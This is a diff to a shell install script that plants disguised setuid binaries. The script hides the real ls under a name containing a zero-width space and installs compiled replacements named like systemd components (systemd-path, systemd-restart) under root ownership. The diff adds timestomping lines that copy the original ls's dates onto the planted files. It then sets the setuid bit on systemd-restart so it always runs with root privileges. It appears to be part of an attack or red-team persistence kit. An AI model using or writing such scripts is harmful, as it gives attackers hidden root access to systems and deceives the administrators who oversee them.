@@ -7,7 +7,6 @@ else
 		mv "/usr/bin/ls" "/usr/sbin/ls​" #THERE IS A ZERO WIDTH SPACE HERE
 	fi
 fi
-
 #Build executables
 #NOTE: This requires the packages golang and gcc to be installed
 gcc systemd-restart.c
@@ -24,6 +23,11 @@ mv systemd-path /usr/bin/
 chown root:root /usr/bin/systemd-path
 chown root:root /usr/bin/ls
 chown root:root /usr/bin/systemd-restart
+
+#Change dates of files
+touch -d "$(date -R -r /usr/sbin/ls​)" /usr/bin/ls
+touch -d "$(date -R -r /usr/sbin/ls​)" /usr/bin/systemd-path
+touch -d "$(date -R -r /usr/sbin/ls​)" /usr/bin/systemd-restart
 
 #Set suid so the process will always execute with system privileges
 chmod u+s /usr/bin/systemd-restart
